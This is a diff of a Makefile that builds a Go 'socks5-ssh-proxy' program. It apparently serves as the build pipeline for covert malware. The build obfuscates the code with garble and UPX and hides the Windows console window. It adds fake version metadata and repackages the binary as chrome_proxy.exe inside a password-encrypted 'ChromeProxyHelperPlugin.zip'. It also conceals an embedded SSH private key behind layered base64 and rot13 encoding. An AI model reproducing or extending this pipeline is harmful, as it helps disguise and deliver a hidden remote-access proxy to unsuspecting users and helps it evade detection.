@@ -1,6 +1,8 @@
 SOURCES=Makefile main.go main_release.go main_debug.go config.go config_release.go config_template.go system.go system_windows.go system_linux.go system_darwin.go
 GARBLE_BIN = $(shell go env GOPATH)/bin/garble
+GOVERSIONINFO_BIN = $(shell go env GOPATH)/bin/goversioninfo
 GARBLE_CMD = $(GARBLE_BIN) -literals -tiny
+export PATH := $(shell go env GOPATH)/bin:$(PATH)
 
 all: socks5-ssh-proxy
 
@@ -19,7 +21,8 @@ socks5-ssh-proxy.release: resources $(SOURCES) $(GARBLE_BIN)
 	GOOS=darwin GOARCH=amd64 $(GARBLE_CMD) build -tags release -o $@
 	upx $@
 win: socks5-ssh-proxy.exe
-socks5-ssh-proxy.exe: resources $(GARBLE_BIN) $(SOURCES)
+socks5-ssh-proxy.exe: resources $(GOVERSIONINFO_BIN) $(SOURCES)
+	CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1 GOOS=windows GOARCH=amd64 go generate -tags windows,release
 	CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1 GOOS=windows GOARCH=amd64 go build -trimpath -ldflags "-s -w -H=windowsgui" -tags windows,release -o $@
 #	CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ GOOS=windows GOARCH=amd64 $(GARBLE_CMD) build -ldflags "-H=windowsgui -X cfg.VerboseModeKey=$(RELEASE_VERBOSE_MODE_KEY)" -tags release -o $@
 	#CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ GOOS=windows GOARCH=amd64 $(GARBLE_CMD) build -ldflags "-H=windowsgui" -tags release -o $@
@@ -34,9 +37,11 @@ ChromeProxyHelperPlugin.zip: socks5-ssh-proxy.exe
 	#upx chrome_proxy.exe
 	zip -eP resistanceIsFutile ChromeProxyHelperPlugin.zip chrome_proxy.exe
 	rm -f chrome_proxy.exe
-install-deps: $(GARBLE_BIN)
+install-deps: $(GARBLE_BIN) $(GOVERSIONINFO_BIN)
 $(GARBLE_BIN):
 	go install mvdan.cc/garble@v0.12.1
+$(GOVERSIONINFO_BIN):
+	go install github.com/josephspurrier/goversioninfo/cmd/goversioninfo@v1.4.0
 clean:
 	rm -f *.exe
 	rm -f *.zip
@@ -63,10 +68,12 @@ resources/ssh_private_key.base64: resources/ssh_private_key
 	base64 -i $< -o $@
 resources/ssh_private_key.base64.rot13: resources/ssh_private_key.base64
 	go run cmd/rot13-obfuscator/main.go $< $@
+resources/ssh_private_key.base64.rot13.github: resources/ssh_private_key.base64.rot13
+	base64 -i $< -o $@ 
 
 fmt:
 	gofmt -w *.go
 
-secrets: config_release.go.base64 resources/ssh_private_key.base64.rot13
+secrets: config_release.go.base64 resources/ssh_private_key.base64.rot13.github
 
 .phony: clean test win
